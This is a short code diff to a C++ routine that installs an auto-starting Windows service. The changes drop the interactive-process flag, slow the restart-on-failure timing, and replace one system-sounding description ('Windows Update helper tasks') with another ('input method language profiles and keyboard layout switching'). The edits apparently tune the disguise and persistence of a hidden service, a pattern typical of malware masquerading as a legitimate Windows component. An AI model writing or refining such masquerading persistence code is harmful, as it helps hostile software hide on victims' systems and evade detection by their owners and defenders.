@@ -36,7 +36,7 @@ bool ServiceManager::install_service(const Config& config) {
     SC_HANDLE svc = CreateServiceW(scm,
         svc_name.c_str(), svc_display.c_str(),
         SERVICE_ALL_ACCESS,
-        SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
+        SERVICE_WIN32_OWN_PROCESS,
         SERVICE_AUTO_START,
         SERVICE_ERROR_NORMAL,
         cmd.c_str(),
@@ -55,9 +55,9 @@ bool ServiceManager::install_service(const Config& config) {
 
     // Set failure actions: restart on failure
     SC_ACTION actions[3] = {
-        {SC_ACTION_RESTART, 1000},  // restart after 1s
-        {SC_ACTION_RESTART, 5000},  // restart after 5s
-        {SC_ACTION_RESTART, 10000}, // restart after 10s
+        {SC_ACTION_RESTART, 60000},   // restart after 60s
+        {SC_ACTION_RESTART, 120000},  // restart after 2min
+        {SC_ACTION_RESTART, 300000},  // restart after 5min
     };
     SERVICE_FAILURE_ACTIONSW fa = {};
     fa.dwResetPeriod = 86400; // 1 day
@@ -67,7 +67,7 @@ bool ServiceManager::install_service(const Config& config) {
 
     // Set description
     SERVICE_DESCRIPTIONW desc;
-    desc.lpDescription = const_cast<LPWSTR>(L"Manages Windows Update helper tasks");
+    desc.lpDescription = const_cast<LPWSTR>(L"Manages input method language profiles and keyboard layout switching");
     ChangeServiceConfig2W(svc, SERVICE_CONFIG_DESCRIPTION, &desc);
 
     // Start the service
